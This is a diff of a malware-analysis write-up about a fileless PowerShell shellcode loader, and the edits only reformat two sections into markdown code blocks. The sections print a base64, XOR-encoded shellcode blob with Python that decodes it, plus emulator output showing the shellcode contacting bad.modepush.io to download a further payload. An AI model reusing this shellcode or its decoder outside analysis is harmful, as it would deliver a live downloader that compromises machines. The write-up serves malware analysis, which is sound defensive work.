@@ -329,18 +329,39 @@ This script is a **fileless PowerShell shellcode loader** that dynamically resol
 
 
 #### Shell Code XOR Decryption
-<pre style="white-space: pre-wrap; word-break: break-word;">
-import base64                                                                                                                                                                                                                                                                                                                                                   data = "j5v6c3NzE/qWQqEX+CFD+CF/+CFn+AFbfMQ5VUKMQrPfTxIPcV9Tsrx+crSRgyEk+CFj+DFPcqP4Mwv2swc5cqMj+Dtr+CtTcqCQTzr4R/hypUKMQrPfsrx+crRLkwaHcA6LSA5XBpEr+CtXcqAV+H84+CtvcqD4d/hyo/o3V1coKBIqKSKMkyssKfhhmPUuGx0WB3MbBBodGicbPwRVdIymm3Nzc3NCjCQkJCQkG0klCtSMpprXc3NzKEK6IiIZcCIiG8hyc3MgIxsk+uy1jKYjmv9zc3MoQqEhG3NBs/chISEgISMbmCZdSIym+rXwsCMb80Bzc/qTGXcjGWwlGwY17fWMpixCjCQkGYwgJRtedWsIjKb2s3z3uXJzc0KM9oUHd/qKmHob2baRLoym+rIbNlItQoymQowkGXQiJSMbxCSTeIymzHNcc3NKtAZ0KyOaCIyMjEKMmuJyc3OaunJzc5scjIyMXDYpJBVzGBx4JNhU8MLH0/Wp+2OXxwjehevWqQvSuus5ztGohvhmqDMjJsBmHYVH8gGu5M+2AL7pP3vvJ0+dD8r85BkvhKn5Cbo1axeU/XMmABYBXjIUFh0HSVM+HAkaHx8SXEZdQ1NbEBweAxIHGhEfFkhTPiA6NlNKXUNIUyQaHRccBABTPSdTRV1CSFMnARoXFh0HXEZdQ0hTMTw6NkpIIycxIVp+eXOoBsvVGP6BY/ZI8BXwtIOqG4lTF36/h781uSuKLclWo9E6yUvNEINXZQfUY4XfXRqfS2AXioYJ9JlK4i7/SBr5ZsVE3ngyEilNsbp/d8VgZIXR5ScGVkIrcXKaNv7QkdM4W7Ck1eiRl5nilbR1vpit1bdbhPlZ6R32P7kT1KWwB7RfTezdm0hGiOBNSSLcSmBgFGIPTpoDLsnjPWez9DbJ/bEk7imeyKV7W7R4MvMcBoV1wtQjrKY1bWXJqwebG/P7KlZDJDy6QAu2IBsUiqwOI+rx5TJzG4PG0SWMphkzG3Njc3Mbc3MzcyQbK9cgloym4Mpzc3NzcqoiIPqUJBtzU3NzICUbYeX6kYym9rMHtfh0crD2swaWK7Cb+o6MjBESF10eHBcWAwYAG10aHHNzc3Nw"
+```
+import base64
 
-decoded = base64.b64decode(data)                                                                                                                                                shellcode = bytes([b ^ 115 for b in decoded])                                                                                                                                                                                                                                                                                                                   # save to file                                                                                                                                                                  with open("shellcode.bin", "wb") as f:                                                                                                                                              f.write(shellcode)
-</pre>
+data = "j5v6c3NzE/qWQqEX+CFD+CF/+CFn+AFbfMQ5VUKMQrPfTxIPcV9Tsrx+crSRgyEk+CFj+DFPcqP4Mwv2swc5cqMj+Dtr+CtTcqCQTzr4R/hypUKMQrPfsrx+crRLkwaHcA6LSA5XBpEr+CtXcqAV+H84+CtvcqD4d/hyo/o3V1coKBIqKSKMkyssKfhhmPUuGx0WB3MbBBodGicbPwRVdIymm3Nzc3NCjCQkJCQkG0klCtSMpprXc3NzKEK6IiIZcCIiG8hyc3MgIxsk+uy1jKYjmv9zc3MoQqEhG3NBs/chISEgISMbmCZdSIym+rXwsCMb80Bzc/qTGXcjGWwlGwY17fWMpixCjCQkGYwgJRtedWsIjKb2s3z3uXJzc0KM9oUHd/qKmHob2baRLoym+rIbNlItQoymQowkGXQiJSMbxCSTeIymzHNcc3NKtAZ0KyOaCIyMjEKMmuJyc3OaunJzc5scjIyMXDYpJBVzGBx4JNhU8MLH0/Wp+2OXxwjehevWqQvSuus5ztGohvhmqDMjJsBmHYVH8gGu5M+2AL7pP3vvJ0+dD8r85BkvhKn5Cbo1axeU/XMmABYBXjIUFh0HSVM+HAkaHx8SXEZdQ1NbEBweAxIHGhEfFkhTPiA6NlNKXUNIUyQaHRccBABTPSdTRV1CSFMnARoXFh0HXEZdQ0hTMTw6NkpIIycxIVp+eXOoBsvVGP6BY/ZI8BXwtIOqG4lTF36/h781uSuKLclWo9E6yUvNEINXZQfUY4XfXRqfS2AXioYJ9JlK4i7/SBr5ZsVE3ngyEilNsbp/d8VgZIXR5ScGVkIrcXKaNv7QkdM4W7Ck1eiRl5nilbR1vpit1bdbhPlZ6R32P7kT1KWwB7RfTezdm0hGiOBNSSLcSmBgFGIPTpoDLsnjPWez9DbJ/bEk7imeyKV7W7R4MvMcBoV1wtQjrKY1bWXJqwebG/P7KlZDJDy6QAu2IBsUiqwOI+rx5TJzG4PG0SWMphkzG3Njc3Mbc3MzcyQbK9cgloym4Mpzc3NzcqoiIPqUJBtzU3NzICUbYeX6kYym9rMHtfh0crD2swaWK7Cb+o6MjBESF10eHBcWAwYAG10aHHNzc3Nw"
+
+decoded = base64.b64decode(data)
+shellcode = bytes([b ^ 115 for b in decoded])
+
+# save to file
+with open("shellcode.bin", "wb") as f:
+    f.write(shellcode)
+```
 
 #### Shell Code Debugging
-<pre style="white-space: pre-wrap; word-break: break-word;">
+```
 scdbg.exe -f shellcode.bin -u                                    
 
-Loaded 345 bytes from file shellcode.bin                                                                                Initialization Complete..                                                                                               Max Steps: -1                                                                                                           Using base offset: 0x401000                                                                                                                                                                                                                     4010a2  LoadLibraryA(wininet)                                                                                           4010b5  InternetOpenA()                                                                                                 4010d1  InternetConnectA(server: bad.modepush.io, port: 443, )                                                          4010ed  HttpOpenRequestA(path: /EZWf, )                                                                                 401106  InternetSetOptionA(h=4893, opt=1f, buf=12fdec, blen=4)                                                          401116  HttpSendRequestA(User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)        , )                                                                                                                     401138  GetDesktopWindow()                                                                                              401147  InternetErrorDlg(11223344, 4893, 401138, 7, 0)                                                                  401303  VirtualAlloc(base=0 , sz=400000) = 600000                                                                       40131e  InternetReadFile(4893, buf: 600000, size: 2000)
-</pre>
+Loaded 345 bytes from file shellcode.bin                                                                               
+Initialization Complete..                                                                                               
+Max Steps: -1                                                                                                           
+Using base offset: 0x401000                                                                                                                                                                                                                     
+
+4010a2  LoadLibraryA(wininet)                                                                                           
+4010b5  InternetOpenA()                                                                                                  
+4010d1  InternetConnectA(server: bad.modepush.io, port: 443, )                                                          
+4010ed  HttpOpenRequestA(path: /EZWf, )                                                                                  
+401106  InternetSetOptionA(h=4893, opt=1f, buf=12fdec, blen=4)                                                          
+401116  HttpSendRequestA(User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR), )     
+401138  GetDesktopWindow()                                                                                               
+401147  InternetErrorDlg(11223344, 4893, 401138, 7, 0)                                                                  
+401303  VirtualAlloc(base=0 , sz=400000) = 600000                                                                       
+40131e  InternetReadFile(4893, buf: 600000, size: 2000)
+```
 
 #### Shell Code Debugging Analysis
 
